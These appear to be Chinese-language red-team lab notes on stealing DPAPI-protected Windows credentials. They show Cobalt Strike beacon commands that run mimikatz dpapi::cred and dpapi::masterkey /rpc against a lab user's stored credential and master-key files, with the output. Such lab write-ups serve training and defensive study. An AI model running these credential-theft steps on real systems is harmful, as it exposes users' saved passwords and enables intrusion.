Data Protection API (DPAPI)是windows里的一个组件，专门用于存储RDP或者第三方软件如谷歌chrome里的数据

在srv-1上操作

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659883791874.png)

在wkstn-1上操作


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659884133595.png)


存有bfmaer密码


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659884225306.png)

留意guidMasterKey


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659884392247.png)

```
beacon> mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\9D54C839752B38B233E5D56FDD7891A7
[*] Tasked beacon to run mimikatz's dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\9D54C839752B38B233E5D56FDD7891A7 command
[+] host called home, sent: 788077 bytes
[+] received output:
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {a23a1631-e2ca-4805-9f2f-fe8966fd8698}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 00000030 - 48
  szDescription      : Local Credential Data

  algCrypt           : 00006603 - 26115 (CALG_3DES)
  dwAlgCryptLen      : 000000c0 - 192
  dwSaltLen          : 00000010 - 16
  pbSalt             : f8fb8d0f5df3f976e445134a2410ffcd
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         : 
  algHash            : 00008004 - 32772 (CALG_SHA1)
  dwAlgHashLen       : 000000a0 - 160
  dwHmac2KeyLen      : 00000010 - 16
  pbHmack2Key        : e8ae77b9f12aef047664529148beffcc
  dwDataLen          : 000000b0 - 176
  pbData             : b8f619c20d96b775f913dad8962ca4bc2bbb9061679ca753b708e28f093d1a1fa3ca193adf7bc9ab1e52fa6784f6b397f329d139f274eef9b665ae843d5e22859792f8f0db15bf4cba64d77e027c177d8540446e5053e1a20b321904212e334fe5cf91a0a31e6c6bbbb674efca8368bdf159edef723291d50356c7154c8d846f1e41defa7c9e998b28cc420660c4b78f1558ca65d49901231707c9ea7a026fb2932d61f4d2bc8cfa88abc6a1a3b493fe
  dwSignLen          : 00000014 - 20
  pbSign             : 2e12c7baddfa120e1982789f7265f9bb94208985

  ```

留意跟guidMasterKey一样的文件夹
1659884555240.png


```
beacon> ls C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-3263068140-2042698922-2891547269-1120
[*] Tasked beacon to list files in C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-3263068140-2042698922-2891547269-1120
[+] host called home, sent: 115 bytes
[*] Listing: C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-3263068140-2042698922-2891547269-1120\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 740b     fil     03/01/2022 14:22:42   1f242f0d-c827-4673-b768-0a544a0b72cd
 740b     fil     05/24/2021 09:09:04   a1f5745d-f392-4469-8f43-c104ef032f8a
 740b     fil     02/21/2021 11:49:40   a23a1631-e2ca-4805-9f2f-fe8966fd8698
 740b     fil     01/20/2022 15:35:21   bdb76a61-a735-415b-a111-11072928a892
 928b     fil     02/21/2021 11:49:40   BK-DEV
 740b     fil     07/23/2022 02:17:28   f0a666c6-7653-4334-9632-45d945137eac
 24b      fil     07/23/2022 02:17:28   Preferred
```

执行
```
mimikatz dpapi::masterkey /in:C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-3263068140-2042698922-2891547269-1120\a23a1631-e2ca-4805-9f2f-fe8966fd8698 /rpc
```








